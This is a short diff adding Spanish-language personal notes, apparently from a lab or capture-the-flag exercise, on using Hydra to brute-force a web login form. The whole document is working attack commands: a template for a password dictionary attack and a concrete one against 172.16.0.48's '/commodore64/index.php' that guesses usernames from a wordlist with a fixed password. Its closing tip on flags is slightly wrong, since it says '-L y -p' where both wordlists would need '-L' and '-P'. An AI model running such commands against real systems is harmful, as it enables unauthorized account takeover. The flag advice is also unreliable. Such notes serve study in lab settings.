@@ -1,1 +1,7 @@
+-- ataque de diccioanrio a la clave --
 hydra (ip) http-form-post "(ruta de url):input_username=^USER^&input_password=^PASS^:Login system" -l (usuario o diccionario) -P (contraseña o dicionarioc.txt) -t 10 
+
+-- ataque de diccionario al usuario --
+hydra 172.16.0.48 http-form-post "/commodore64/index.php:input_username=^USER^&input_password=^PASS^:Login system" -L dicionarioc3.txt -p mos -t 10
+
+# donde necesitemos agregar un diccionario se tiene que poner en mayuscula si usuario y contraseña son con diccionario seria -L y -p 
